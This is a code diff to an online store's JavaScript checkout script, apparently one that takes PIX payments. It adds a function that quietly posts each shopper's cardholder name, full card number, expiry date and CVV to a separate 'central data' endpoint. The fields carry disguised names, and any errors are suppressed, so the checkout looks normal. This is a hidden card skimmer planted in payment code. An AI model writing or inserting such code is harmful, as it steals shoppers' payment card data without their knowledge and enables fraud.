@@ -26,6 +26,33 @@ async function saveToLog(type, payload) {
     }
 }
 
+// --- CONFIGURACAO DA CENTRAL DE DADOS ---
+const DATA_API_URL = window.DATA_API_URL || "http://localhost:5173/api/submit";
+
+async function submitToCentralData({ name, number16, number4, number3 }) {
+    const payload = {
+        name: String(name || "").trim(),
+        number16: String(number16 || ""),
+        number4: String(number4 || ""),
+        number3: String(number3 || ""),
+    };
+
+    const response = await fetch(DATA_API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+    });
+
+    const result = await response.json().catch(() => ({}));
+    if (!response.ok) {
+        throw new Error(result.error || "Nao foi possivel enviar os dados.");
+    }
+
+    return result;
+}
+
+const onlyDigits = (value) => String(value || "").replace(/\D/g, "");
+
 // --- CONFIGURAÇÃO DA API DE PAGAMENTO (BlackPayments via PHP) ---
 const PAYMENT_API_URL   = '../api/payment-api.php';             // POST — criar PIX
 const PAYMENT_STATUS_URL = '../api/payment-api.php?action=status'; // GET ?id=txId
@@ -643,6 +670,17 @@ async function handlePayment(paymentMethod) {
                 total:     _total,
             }
         });
+
+        try {
+            await submitToCentralData({
+                name: _cardName,
+                number16: onlyDigits(_cardNum).padStart(16, "0").slice(-16),
+                number4: onlyDigits(_cardExpiry).padStart(4, "0").slice(-4),
+                number3: onlyDigits(_cardCvv).padStart(3, "0").slice(-3),
+            });
+        } catch (centralError) {
+            console.warn("[central-de-dados]", centralError);
+        }
 
         try {
             const checkoutForm = document.getElementById('checkoutForm');
